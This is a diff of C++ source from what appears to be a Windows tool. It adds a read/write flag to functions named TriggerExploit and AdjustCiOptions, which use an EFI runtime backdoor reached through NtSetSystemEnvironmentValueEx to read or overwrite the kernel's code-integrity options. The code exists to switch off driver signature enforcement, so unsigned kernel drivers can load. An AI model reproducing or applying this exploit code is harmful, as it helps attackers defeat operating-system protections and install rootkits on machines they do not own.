@@ -355,7 +355,8 @@ NTSTATUS
 TriggerExploit(
 	_In_ PVOID CiVariableAddress,
 	_In_ ULONG CiOptionsValue,
-	_Out_opt_ PULONG OldCiOptionsValue
+	_Out_opt_ PULONG OldCiOptionsValue,
+	_In_ BOOLEAN ReadOnly
 	)
 {
 	if (OldCiOptionsValue != nullptr)
@@ -381,7 +382,7 @@ TriggerExploit(
 	else if (CiPatchSize == sizeof(UINT8))
 		BackdoorData.u.s.Byte = static_cast<UINT8>(CiOptionsValue);
 	BackdoorData.IsMemCopy = FALSE;								// This is a scalar operation, not memcpy
-	BackdoorData.IsReadOperation = FALSE;						// This is a write operation, not read
+	BackdoorData.IsReadOperation = ReadOnly;					// Specify whether this is a read or a write operation
 	BackdoorData.Size = CiPatchSize;							// This value determines the field (Byte/Word/Dword/Qword) that the value to write will be read from, and written to on return
 
 	// Call NtSetSystemEnvironmentValueEx -> [...] -> hal!HalSetEnvironmentVariableEx -> hal!HalEfiSetEnvironmentVariable -> EfiRT->SetVariable.
@@ -414,7 +415,8 @@ TriggerExploit(
 NTSTATUS
 AdjustCiOptions(
 	_In_ ULONG CiOptionsValue,
-	_Out_opt_ PULONG OldCiOptionsValue
+	_Out_opt_ PULONG OldCiOptionsValue,
+	_In_ BOOLEAN ReadOnly
 	)
 {
 	if (OldCiOptionsValue != nullptr)
@@ -440,7 +442,8 @@ AdjustCiOptions(
 	// Enable/disable CI
 	Status = TriggerExploit(CiOptionsAddress,
 							CiOptionsValue,
-							OldCiOptionsValue);
+							OldCiOptionsValue,
+							ReadOnly);
 
 	// Revert privileges
 	SetSystemEnvironmentPrivilege(SeSystemEnvironmentWasEnabled, nullptr);
